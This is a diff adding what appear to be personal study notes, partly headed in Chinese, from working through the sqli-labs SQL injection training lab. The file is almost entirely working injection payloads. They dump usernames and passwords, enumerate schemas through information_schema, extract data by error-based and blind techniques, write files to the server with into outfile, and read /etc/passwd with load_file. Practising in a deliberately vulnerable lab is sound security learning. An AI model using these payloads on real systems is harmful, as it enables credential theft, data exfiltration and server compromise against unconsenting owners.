@@ -1,0 +1,33 @@
+id=' union select null,group_concat(username),group_concat(password) from users %23
+id=' union select null,group_concat(table_name),null from information_schema.tables where table_schema='security' %23
+id=' union select null,database(),null %23
+id=' union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a,null from information_schema.tables group by a %23
+union select 1,2,3 into outfile "/var/www/sqli-labs/Less-7/union2.txt" %23
+
+基于报错:
+select database();
+select (select database());
+select concat((select database()));
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a);
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a)a;
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor (rand()*2));
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor (rand()*2))a;
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns;
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables;
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;
+select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;
+select count(*),concat(0x3a,0x3a,(select version()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;
+select count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;
+
+select * from users into outfile “/tmp/tests.txt”;
+select * from users limit 0,1 into dumpfile “/tmp/test2.txt”;
+select load_file(“etc/passwd”);
+select load_file(“etc/passwd”) into outfile “tmp/test4.txt”;
+
+基于盲注:
+select length(database());
+select substr(database(),1,1);
+select ascii(substr(database(),1,1));
+select ascii(substr(database(),1,1))=115;
+
+
